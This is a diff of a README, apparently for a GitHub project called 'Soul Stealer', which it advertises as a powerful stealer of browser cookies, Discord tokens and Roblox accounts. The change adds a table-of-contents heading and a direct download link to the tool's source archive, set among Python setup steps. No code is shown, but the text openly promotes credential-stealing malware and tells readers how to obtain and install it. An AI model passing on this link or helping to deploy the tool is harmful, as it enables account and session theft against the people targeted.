@@ -4,6 +4,8 @@ The MOST powerful stealer (Cookie stealer, Discord token stealer, Roblox stealer
 
 ![image](https://github.com/user-attachments/assets/7f36811f-0077-4a17-8d17-483d35ab1184)
 
+# Table of Content 
+
 
 
 
@@ -69,7 +71,7 @@ The MOST powerful stealer (Cookie stealer, Discord token stealer, Roblox stealer
 
 • Verify the installation by executing python --version in CMD.
 
-• Download Soul Stealer.
+• [Download](https://github.com/idkkkshadoww/Soul-Stealer/archive/refs/heads/main.zip) Soul Stealer.
 
 • Extract the zip file.
 
